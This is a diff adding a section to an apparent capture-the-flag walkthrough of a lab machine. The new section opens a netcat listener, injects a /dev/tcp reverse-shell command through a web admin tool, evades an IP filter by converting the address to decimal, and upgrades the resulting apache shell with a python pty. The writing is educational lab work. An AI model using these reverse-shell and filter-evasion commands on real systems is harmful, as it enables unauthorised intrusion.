@@ -407,7 +407,85 @@ Command output: . .. index.html robots.txt testdata.txt testingnotes.txt
 
 cgi-bin directory is. unfortunately, empty. The host dir contains files that we have already downloaded and seen. No surprises and no new info.
 
-So what know? We must be honest here. This is the most difficult point. In real world, when someone looks for escalation to root or even user account he does not know if this is possible. The reason is simple. Linux machines are security oriented (always have been) without a misconfiguration or some other security pitfall is  is not possible for escalation to happen. This si especially true for servers that care about security. So an attacker can search forever without progress. That does not mean in real world unix type machines are invulnerable. Many of there are, it is just too difficult to be exploited, or simpler the attacker does not know if a vulnerability exists in the system. Which is very dishearting. This si the reason why persistence and patience are virtues for cybersecurity operations.
+So what know? We must be honest here. This is the most difficult point. In real world, when someone looks for escalation to root or even user account he does not know if this is possible. The reason is simple. Linux machines are security oriented (always have been) without a misconfiguration or some other security pitfall is  is not possible for escalation to happen. This si especially true for servers that care about security. So an attacker can search forever without progress. That does not mean in real world unix type machines are invulnerable. Many of there are, it is just too difficult to be exploited, or simpler the attacker does not know if a vulnerability exists in the system. Which is very disheartening. This is the reason why persistence and patience are virtues for cybersecurity operations.
 
 Our target does not belong to this category. It is setup that way to contain at least one weak points, which waits to be exploited. So we can be encouraged by this and move on.
+
+The next step is to get a "normal" bash shell to work. The admin tool (web interface restricts us). So we need a reverse shell. We are going to anchor (connect) to our machine by initiating the connection from the target machine. This is very common and the reason is that many machines use firewalls which have inbound rules but not outbound rules, making a reverse shell opening possible. 
+
+Our first step is to "open" a port. That means to make a port listening and also be sure that there is no firewall blocking this port on our attacking machine. This port is better be greater than 1024, so no root privileges are needed. Of course we can use any port that is not in use, and because we own our machine we have root access, but for security reasons it is better not to use root to open a port (you never know what can happen). Let's peek port 23456. On our machine we execute:
+
+```
+$ nc -nvl -p 23456
+Listening on [any] 23456 ...
+```
+
+Flags explanation:
+
+- n: Do not resolve names (bypass DNS resolve)
+- v: Verbose output
+- l: Listen
+- p: Port number
+
+Now, on target machine, we try on admin tool at https://earth.local/admin/
+
+```
+sh -i >& /dev/tcp/10.0.2.4/23456 0>&1
+Command output:
+```
+
+Nothing happened. Disappointing. A possible reason is that the tool has some basic build in security, detecting an IP format and rejecting it if this is the case. It is worth trying to convert the IP format by presenting it without dots. We have two options here, converting "10.0.2.4" to decimal format (by the way, this IP is the attacking machine's IP) or we can convert it to base 64 as a payload. Let's follow the former. We can use an inline tool for conversion, but, as geeks it will be better to write our own script. Right? Right.
+
+Conversion is easy, we just write and save the following script:
+
+```
+$ cat > ipConverter.sh
+#!/bin/bash
+
+ip_to_decimal () {
+    local a b c d IP=$@
+    IFS=.
+    read -r a b c d <<< "$IP"
+    printf '%d\n' "$((a * 256 ** 3 + b * 256 ** 2 + c * 256 + d))"
+}
+
+ip_to_decimal "$@"
+^D
+$ chmod 700 ipConverter.sh
+$./ipConverter.sh 10.0.2.4
+167772676
+```
+
+Cool. We try again:
+
+```
+sh -i >& /dev/tcp/167772676/23456 0>&1
+Command output:
+```
+
+And on our machine we see this:
+
+```
+nc -nvl -p 23456
+listening on [any] 23456 ...
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.7] 44426
+sh: cannot set terminal process group (830): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-5.1$ whoami
+whoami
+apache
+sh-5.1$
+```
+
+It works! We can now use the bash from our own machine. The shell and terminal are very basic though. It will be good to improve it.
+
+
+```
+sh-5.1$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+bash-5.1$
+echo $TERM
+dumb
+```
+
+We have a pseudo-terminal now(which is dumb).
 
